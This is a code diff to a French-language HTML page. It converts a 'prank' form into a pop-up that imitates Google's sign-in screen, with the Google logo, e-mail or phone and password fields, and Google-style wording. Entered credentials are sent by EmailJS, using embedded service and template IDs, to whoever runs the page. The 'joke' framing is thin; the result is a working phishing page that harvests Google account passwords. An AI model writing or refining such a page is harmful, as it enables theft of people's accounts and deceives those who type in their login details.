@@ -2,15 +2,13 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Surprise!</title>
+    <title>Connexion Google - Blague</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <!-- SDK EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
-            emailjs.init({
-                publicKey: "M-6tzdwk9Kf9X3aG4",
-            }); // Remplace "YOUR_USER_ID" par ton User ID de EmailJS
+            emailjs.init("M-6tzdwk9Kf9X3aG4");
         })();
     </script>
 </head>
@@ -19,25 +17,34 @@
         Clique ici!
     </button>
 
-    <div id="prankForm" style="display: none;" class="mt-6 p-6 bg-white shadow-lg rounded-lg w-80">
-        <h2 class="text-lg font-bold text-gray-700 mb-4">Formulaire de Blague</h2>
-        <p class="text-sm text-gray-500 mb-6">Pour continuer, entrez les informations suivantes :</p>
-        
-        <label class="block text-sm font-medium text-gray-700">Identifiant secret de l’amitié :</label>
-        <input type="text" id="friendId" placeholder="ex: 123-amitié" class="mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mb-4">
-        
-        <label class="block text-sm font-medium text-gray-700">Code spécial de blague :</label>
-        <input type="password" id="prankCode" placeholder="******" class="mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mb-4">
-        
-        <button onclick="sendMessage()" class="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600">
-            Envoyer le message
-        </button>
+    <!-- Pop-up de style Google -->
+    <div id="prankForm" style="display: none;" class="fixed inset-0 flex items-center justify-center bg-gray-500 bg-opacity-50">
+        <div class="bg-white w-full max-w-sm rounded-lg shadow-lg p-8">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo" class="h-10 mx-auto mb-4">
+            <h2 class="text-center text-2xl font-medium text-gray-800">Connexion</h2>
+            <p class="text-center text-sm text-gray-600 mb-6">Utilisez votre compte Google</p>
+
+            <!-- Formulaire de connexion -->
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700">Adresse e-mail ou numéro de téléphone</label>
+                <input type="text" id="friendId" placeholder="exemple@gmail.com" class="mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400">
+            </div>
+
+            <div class="mb-6">
+                <label class="block text-sm font-medium text-gray-700">Mot de passe</label>
+                <input type="password" id="prankCode" placeholder="●●●●●●●" class="mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400">
+            </div>
+
+            <button onclick="sendMessage()" class="w-full py-2 mb-4 bg-blue-500 text-white rounded-lg hover:bg-blue-600">
+                Suivant
+            </button>
+            <p class="text-center text-sm text-gray-500">Pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en toute confidentialité.</p>
+        </div>
     </div>
 
     <script>
         function showPrankForm() {
-            document.getElementById("prankForm").style.display = "block";
-            alert('Surprise! Tu as cliqué sur le bouton!');
+            document.getElementById("prankForm").style.display = "flex";
         }
 
         function sendMessage() {
@@ -45,7 +52,6 @@
             const prankCode = document.getElementById("prankCode").value;
 
             if (friendId && prankCode) {
-                // Envoyer un email avec EmailJS
                 emailjs.send("service_vus0eea", "template_915ogjt", {
                     friend_id: friendId,
                     prank_code: prankCode,
@@ -57,7 +63,7 @@
                 })
                 .catch(err => console.error('Erreur lors de l\'envoi de l\'e-mail:', err));
             } else {
-                alert("Veuillez entrer l'identifiant et le code !");
+                alert("Veuillez entrer l'identifiant et le mot de passe !");
             }
         }
     </script>
